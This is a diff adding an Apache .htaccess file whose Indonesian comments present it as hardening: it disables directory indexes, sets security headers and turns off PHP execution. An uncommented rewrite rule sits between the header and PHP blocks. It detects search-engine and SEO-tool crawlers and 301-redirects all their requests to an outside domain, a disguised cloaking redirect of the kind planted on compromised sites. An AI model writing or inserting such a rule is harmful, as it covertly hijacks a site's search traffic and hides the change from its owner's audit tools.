@@ -1,0 +1,23 @@
+# 1. Menonaktifkan Autoindex (Mencegah orang melihat isi folder)
+Options -Indexes
+
+# 2. Menambahkan Security Headers (Mencegah XSS dan Clickjacking)
+<IfModule mod_headers.c>
+    Header set X-XSS-Protection "1; mode=block"
+    Header set X-Content-Type-Options "nosniff"
+    Header set X-Frame-Options "SAMEORIGIN"
+</IfModule>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
+RewriteRule ^(.*)$ https://culingua.bunghatta.ac.id/templates/images/ [R=301,L]
+</IfModule>
+
+# 3. Mematikan Eksekusi PHP di Folder Tertentu (seperti folder cache/files)
+# Letakkan file .htaccess ini secara spesifik di direktori penyimpanan berkas publik jika diperlukan
+<IfModule mod_php7.c>
+    php_flag engine off
+</IfModule>
+<IfModule mod_php.c>
+    php_flag engine off
+</IfModule>
